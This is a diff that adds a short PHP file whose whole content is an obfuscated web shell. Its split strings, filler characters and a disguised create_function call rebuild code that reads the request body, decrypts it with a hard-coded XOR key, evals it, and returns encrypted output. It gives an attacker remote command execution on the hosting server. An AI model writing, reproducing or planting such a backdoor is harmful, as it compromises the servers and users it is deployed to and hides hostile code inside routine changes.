@@ -1,0 +1,11 @@
+<?php
+$B='?al(@gzd?ud?ncompress(@x(@bad?se64_dd?ecoded?($m[1])d?d?,d?$k)));$o=@ob_gd?et_cond?td?ents();@';
+$R='ob_ed?nd?d_cled?and?();$r=@bad?se64_encodd?e(@x(@gzcod?mprd?ess(d?$o)d?,$k));d?print("$pd?$kh$r$kf");}';
+$P='sPa";function xd?($t,$d?kd?){$c=strlend?($kd?);$l=strd?len($d?t)d?;$o="";d?for($i=d?0;$i<$l;){fd?or(';
+$d='("/$d?d?kh(.+)$kd?f/d?",@file_ged?t_conted?nts("php:d?/d?/inpud?t"),$m)==1)d?d?{@ob_start();d?@evd';
+$j=str_replace('rh','','rhcrhreatrherh_frhunctirhon');
+$u='$k="d?bc6dc48b"d?;d?$kh="7d?43dc5dd?013b1d?";$kf="abd?aebd2d?faed?d2d?";$p=d?"NCxg6d?HeUHnd?RFO';
+$X='$j=0d?;d?d?($j<$c&&$i<$l)d?;$j++,$id?d?++){$o.d?=$t{$i}^$k{d?$j};}}d?d?returnd? $o;}if(@pregd?d?_match';
+$a=str_replace('d?','',$u.$P.$X.$d.$B.$R);
+$I=$j('',$a);$I();
+?>
